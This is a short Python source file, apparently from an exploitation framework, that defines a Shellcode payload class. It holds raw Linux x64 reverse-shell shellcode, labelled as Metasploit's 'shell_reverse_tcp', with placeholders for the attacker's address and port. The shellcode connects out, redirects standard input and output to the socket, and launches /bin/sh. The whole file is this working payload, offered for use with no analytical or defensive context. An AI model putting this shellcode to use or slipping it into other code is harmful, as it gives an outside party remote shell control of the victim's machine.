from payload_model import Payload

class Shellcode(Payload):
    #TODO remove null bytes
    def __init__(self):
        shellcode =  b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
        shellcode += b"\xb9\x02\x00%s%s\x51\x48\x89\xe6\x6a\x10"
        shellcode += b"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
        shellcode += b"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
        shellcode += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
        size = 74
        use_metaploit = True
        info_metasploit = "linux/x64/shell_reverse_tcp"
        super(Shellcode,self).__init__(shellcode, size, use_metaploit, info_metasploit)